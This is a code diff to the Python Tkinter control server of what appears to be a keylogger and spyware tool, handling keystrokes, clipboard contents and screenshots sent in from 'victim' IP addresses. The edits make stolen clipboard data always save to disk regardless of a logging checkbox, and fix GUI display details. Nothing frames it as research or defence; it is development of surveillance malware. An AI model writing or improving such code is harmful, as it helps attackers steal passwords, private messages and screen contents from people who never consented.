@@ -63,9 +63,11 @@ def handle_post():
             logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
             save_to_file(keystrokes_file_path, f"{victim_ip}: {keyboard_data}")
 
-        if show_clipboard_in_logs and clipboard_data:
-            logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")
+        if clipboard_data:
+            # Save clipboard data to file regardless of checkbox state
             save_to_file(clipboard_file_path, f"{victim_ip}: {clipboard_data}")
+            if show_clipboard_in_logs:
+                logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")
 
         if screenshot_base64:
             save_screenshot(screenshot_base64, victim_ip)
@@ -131,7 +133,7 @@ class ServerGUI:
         self.log_frame = ttk.Frame(self.notebook)
         self.notebook.add(self.log_frame, text="Logs")
 
-        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=90, height=30, wrap=tk.WORD, bg='white', fg='white')
+        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=90, height=30, wrap=tk.WORD, bg='white', fg='black')
         self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
         self.log_text.tag_configure("INFO", foreground="black")
         self.log_text.tag_configure("WARNING", foreground="orange")
@@ -159,6 +161,7 @@ class ServerGUI:
 
         self.clipboard_check = ttk.Checkbutton(self.control_frame, text="Show Clipboard in Logs", command=self.toggle_clipboard_logging)
         self.clipboard_check.pack(pady=10)
+        self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])
 
         self.server_thread = None
         self.server_running = False
@@ -185,6 +188,8 @@ class ServerGUI:
         show_clipboard_in_logs = not show_clipboard_in_logs
         status = "enabled" if show_clipboard_in_logs else "disabled"
         self.log(f"Clipboard logging {status}.")
+        # Update the checkbox state
+        self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])
 
     def log(self, message):
         # Directly emit log to the GUI
